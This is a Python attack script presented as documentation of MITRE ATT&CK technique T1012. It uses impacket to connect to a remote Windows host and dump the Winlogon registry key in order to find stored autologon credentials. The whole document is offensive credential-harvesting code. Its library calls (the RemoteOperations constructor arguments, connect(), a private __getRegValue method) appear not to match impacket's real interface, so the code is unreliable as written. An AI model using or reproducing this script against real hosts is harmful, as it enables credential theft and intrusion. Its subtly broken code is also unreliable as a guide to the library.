# < ---- DOCUMENTATION OF MITRE ATT&CK TECHNIQUE ---- >
# T1012 - Query Registry
# Objective: Remotely query the registry to find sensitive information. This script checks for autologon credentials.

#!/usr/bin/env python3
import sys
from impacket.examples.secretsdump import RemoteOperations

def query_registry(target, username, password, domain):
    try:
        print(f"[*] Querying registry for Winlogon credentials on {target}...")
        remote_ops = RemoteOperations(target, username, password, domain)
        remote_ops.connect()
        
        # Key to check for autologon credentials
        key_path = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
        
        print(f"[*] Checking key: HKLM\\{key_path}")
        data = remote_ops._RemoteOperations__getRegValue(key_path)
        
        if data:
            print("[+] Registry key found. Values:")
            for value in data.values:
                print(f"    {value[0]}: {value[1]}")
        else:
            print("[-] Key not found or no data available.")
            
        remote_ops.disconnect()
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == '__main__':
    if len(sys.argv) != 5:
        print("Usage: ./t1012_query_registry.py <target> <username> <password> <domain>")
        sys.exit(1)

    query_registry(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])